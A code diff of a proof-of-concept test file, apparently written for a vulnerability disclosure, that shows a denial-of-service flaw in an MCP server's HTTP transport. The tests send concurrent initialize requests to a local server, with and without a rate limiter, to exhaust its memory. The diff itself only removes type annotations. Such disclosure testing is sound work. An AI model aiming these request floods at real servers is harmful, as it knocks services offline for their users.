@@ -20,14 +20,14 @@ import { StreamableHttpTransport } from '../../server/transport/streamable-http.
 import { getServer } from '../../server/server.js';
 import { StreamableHTTPServerTransport } from '@modelcontextprotocol/sdk/server/streamableHttp.js';
 
-// Custom Rate Limiter tanpa type annotation agar tidak crash di Babel
+// Custom Rate Limiter tanpa type annotation
 const createRateLimiter = () => {
     let windowStart = 0;
     let requestCount = 0;
     const windowMs = 1000;
     const max = 100;
 
-    return (req: any, res: any, next: any) => {
+    return (req, res, next) => {
         const now = Date.now();
         if (!windowStart || (now - windowStart > windowMs)) {
             windowStart = now;
@@ -44,9 +44,9 @@ const createRateLimiter = () => {
 };
 
 describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', () => {
-    let transport: StreamableHttpTransport;
+    let transport;
     const targetPort = 8913;
-    let originalConsoleError: typeof console.error;
+    let originalConsoleError;
 
     beforeAll(() => {
         originalConsoleError = console.error;
@@ -60,12 +60,12 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
     // TEST 1: Tanpa Rate Limiter (Bare-metal server)
     it('should trigger getServer() and memory exhaustion on concurrent requests', async () => {
         let getServerCallCount = 0;
-        console.error = (...args: any[]) => {
+        console.error = (...args) => {
             if (args[0] === 'Supported networks:') getServerCallCount++;
         };
 
         transport = new StreamableHttpTransport(targetPort, 'localhost', '/mcp', 'disabled');
-        await transport.start({} as any);
+        await transport.start({});
 
         const targetUrl = `http://localhost:${targetPort}/mcp`;
         const payload = { jsonrpc: '2.0', method: 'initialize', params: {}, id: 1 };
@@ -100,7 +100,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
     // TEST 2: Dengan Rate Limiter (Simulasi API Gateway 100 req/s)
     it('should still cause memory exhaustion even with a rate limiter (100 req/s)', async () => {
         let getServerCallCount = 0;
-        console.error = (...args: any[]) => {
+        console.error = (...args) => {
             if (args[0] === 'Supported networks:') getServerCallCount++;
         };
 
@@ -109,7 +109,7 @@ describe('[POC] DoS via Stateful Re-instantiation on Stateless HTTP Transport', 
         app.use(express.json());
         app.use(createRateLimiter()); // <-- Memasang pertahanan Rate Limiter
         
-        app.post('/mcp', async (req: any, res: any) => {
+        app.post('/mcp', async (req, res) => {
             try {
                 // Ini adalah kode rentan dari streamable-http.ts baris 45
                 const mcpServer = await getServer();
